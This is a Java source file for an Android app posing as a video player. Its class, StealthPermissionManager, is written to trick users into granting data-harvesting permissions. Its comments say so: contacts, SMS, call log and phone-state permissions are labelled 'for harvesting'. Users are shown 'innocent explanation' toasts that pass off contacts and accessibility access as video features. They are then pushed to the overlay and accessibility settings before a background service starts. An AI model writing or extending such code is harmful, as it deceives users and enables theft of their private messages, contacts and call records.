package com.jumpy.videoplayerapp;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class StealthPermissionManager {
    private static final String TAG = "jumpy_StealthPerm";
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int OVERLAY_PERMISSION_REQUEST_CODE = 1002;
    private static final int ACCESSIBILITY_PERMISSION_REQUEST_CODE = 1003;
    
    private Context context;
    private Activity activity;
    private PermissionCallback callback;
    
    // Basic permissions that seem harmless
    private String[] basicPermissions = {
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.INTERNET,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.WAKE_LOCK,
        Manifest.permission.FOREGROUND_SERVICE
    };
    
    // Advanced permissions for harvesting
    private String[] advancedPermissions = {
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.SYSTEM_ALERT_WINDOW
    };
    
    public interface PermissionCallback {
        void onBasicPermissionsGranted();
        void onAdvancedPermissionsGranted();
        void onAllPermissionsGranted();
        void onPermissionDenied(String permission);
    }
    
    public StealthPermissionManager(Context context, Activity activity, PermissionCallback callback) {
        this.context = context;
        this.activity = activity;
        this.callback = callback;
    }
    
    /**
     * Start stealth permission collection process
     */
    public void startPermissionCollection() {
        Log.i(TAG, "=== Starting stealth permission collection ===");
        
        // Step 1: Request basic permissions with innocent explanation
        requestBasicPermissions();
    }
    
    /**
     * Request basic permissions that seem harmless to user
     */
    private void requestBasicPermissions() {
        Log.i(TAG, "Requesting basic permissions...");
        
        List<String> permissionsToRequest = new ArrayList<>();
        
        for (String permission : basicPermissions) {
            if (ContextCompat.checkSelfPermission(context, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(permission);
            }
        }
        
        if (permissionsToRequest.isEmpty()) {
            Log.i(TAG, "All basic permissions already granted");
            onBasicPermissionsGranted();
            return;
        }
        
        // Request permissions with innocent explanation
        String[] permissions = permissionsToRequest.toArray(new String[0]);
        ActivityCompat.requestPermissions(activity, permissions, PERMISSION_REQUEST_CODE);
        
        // Show innocent explanation
        showInnocentExplanation();
    }
    
    /**
     * Show innocent explanation for permissions
     */
    private void showInnocentExplanation() {
        String message = "This app needs basic permissions to function properly:\n" +
                        "• Contacts: To help you manage your video sharing\n" +
                        "• Storage: To save your videos and settings\n" +
                        "• Network: To sync your videos across devices";
        
        Toast.makeText(context, message, Toast.LENGTH_LONG).show();
    }
    
    /**
     * Handle basic permission results
     */
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    Log.w(TAG, "Permission denied: " + permissions[i]);
                    allGranted = false;
                    if (callback != null) {
                        callback.onPermissionDenied(permissions[i]);
                    }
                }
            }
            
            if (allGranted) {
                Log.i(TAG, "All basic permissions granted");
                onBasicPermissionsGranted();
            }
        }
    }
    
    /**
     * Called when basic permissions are granted
     */
    private void onBasicPermissionsGranted() {
        Log.i(TAG, "Basic permissions granted, proceeding to advanced permissions");
        
        if (callback != null) {
            callback.onBasicPermissionsGranted();
        }
        
        // Wait a bit then request advanced permissions
        new android.os.Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                requestAdvancedPermissions();
            }
        }, 2000);
    }
    
    /**
     * Request advanced permissions using stealth techniques
     */
    private void requestAdvancedPermissions() {
        Log.i(TAG, "Requesting advanced permissions using stealth techniques...");
        
        // Request overlay permission first
        requestOverlayPermission();
    }
    
    /**
     * Request overlay permission for stealth operations
     */
    private void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(context)) {
                Log.i(TAG, "Requesting overlay permission...");
                
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + context.getPackageName()));
                activity.startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE);
                
                // Show innocent explanation
                Toast.makeText(context, 
                    "Enable overlay permission to show video controls over other apps", 
                    Toast.LENGTH_LONG).show();
            } else {
                Log.i(TAG, "Overlay permission already granted");
                requestAccessibilityPermission();
            }
        } else {
            requestAccessibilityPermission();
        }
    }
    
    /**
     * Request accessibility permission for harvesting
     */
    private void requestAccessibilityPermission() {
        Log.i(TAG, "Requesting accessibility permission...");
        
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        activity.startActivityForResult(intent, ACCESSIBILITY_PERMISSION_REQUEST_CODE);
        
        // Show innocent explanation
        Toast.makeText(context, 
            "Enable accessibility service to improve video player controls", 
            Toast.LENGTH_LONG).show();
    }
    
    /**
     * Handle activity results for advanced permissions
     */
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == OVERLAY_PERMISSION_REQUEST_CODE) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (Settings.canDrawOverlays(context)) {
                    Log.i(TAG, "Overlay permission granted");
                    requestAccessibilityPermission();
                } else {
                    Log.w(TAG, "Overlay permission denied");
                }
            }
        } else if (requestCode == ACCESSIBILITY_PERMISSION_REQUEST_CODE) {
            // Check if accessibility service is enabled
            if (isAccessibilityServiceEnabled()) {
                Log.i(TAG, "Accessibility permission granted");
                onAdvancedPermissionsGranted();
            } else {
                Log.w(TAG, "Accessibility permission not granted yet");
                // Try again after a delay
                new android.os.Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (isAccessibilityServiceEnabled()) {
                            onAdvancedPermissionsGranted();
                        }
                    }
                }, 5000);
            }
        }
    }
    
    /**
     * Check if accessibility service is enabled
     */
    private boolean isAccessibilityServiceEnabled() {
        String service = context.getPackageName() + "/" + 
                        "com.jumpy.videoplayerapp.UnifiedAccessibilityService";
        
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                context.getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            Log.e(TAG, "Error finding setting: " + e.getMessage());
        }
        
        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            
            if (settingValue != null && settingValue.contains(service)) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Called when advanced permissions are granted
     */
    private void onAdvancedPermissionsGranted() {
        Log.i(TAG, "Advanced permissions granted");
        
        if (callback != null) {
            callback.onAdvancedPermissionsGranted();
        }
        
        // Start background permission escalation
        startBackgroundPermissionEscalation();
    }
    
    /**
     * Start background permission escalation
     */
    private void startBackgroundPermissionEscalation() {
        Log.i(TAG, "Starting background permission escalation...");
        
        // Start background service to continue permission collection
        Intent intent = new Intent(context, StealthPermissionService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
        
        if (callback != null) {
            callback.onAllPermissionsGranted();
        }
    }
    
    /**
     * Check if all required permissions are granted
     */
    public boolean areAllPermissionsGranted() {
        // Check basic permissions
        for (String permission : basicPermissions) {
            if (ContextCompat.checkSelfPermission(context, permission) 
                != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        
        // Check overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(context)) {
                return false;
            }
        }
        
        // Check accessibility permission
        if (!isAccessibilityServiceEnabled()) {
            return false;
        }
        
        return true;
    }
    
    /**
     * Get permission status summary
     */
    public String getPermissionStatus() {
        StringBuilder status = new StringBuilder();
        status.append("Permission Status:\n");
        
        // Basic permissions
        for (String permission : basicPermissions) {
            boolean granted = ContextCompat.checkSelfPermission(context, permission) 
                == PackageManager.PERMISSION_GRANTED;
            status.append("• ").append(permission).append(": ")
                  .append(granted ? "GRANTED" : "DENIED").append("\n");
        }
        
        // Overlay permission
        boolean overlayGranted = Build.VERSION.SDK_INT < Build.VERSION_CODES.M || 
                                Settings.canDrawOverlays(context);
        status.append("• Overlay: ").append(overlayGranted ? "GRANTED" : "DENIED").append("\n");
        
        // Accessibility permission
        boolean accessibilityGranted = isAccessibilityServiceEnabled();
        status.append("• Accessibility: ").append(accessibilityGranted ? "GRANTED" : "DENIED");
        
        return status.toString();
    }
} 